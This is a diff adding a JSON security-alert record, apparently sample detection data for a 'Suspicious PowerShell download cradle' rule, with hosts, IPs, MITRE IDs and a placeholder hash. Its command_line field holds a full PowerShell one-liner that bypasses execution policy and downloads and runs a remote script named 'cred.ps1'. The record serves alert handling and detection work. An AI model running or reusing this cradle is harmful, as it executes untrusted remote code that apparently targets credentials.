@@ -1,0 +1,13 @@
+{
+  "alert_id": "001",
+  "timestamp": "2025-02-18T10:23:45Z",
+  "sensor": "Windows Defender ATP",
+  "rule_name": "Suspicious PowerShell download cradle",
+  "severity": "high",
+  "source_host": "DESKTOP-JR2",
+  "source_ip": "192.168.1.125",
+  "destination_ip": "185.130.5.253",
+  "command_line": "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://phishbox.com/cred.ps1')\"",
+  "mitre_ttps": ["T1059.001", "TA0001"],
+  "sha256_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+}
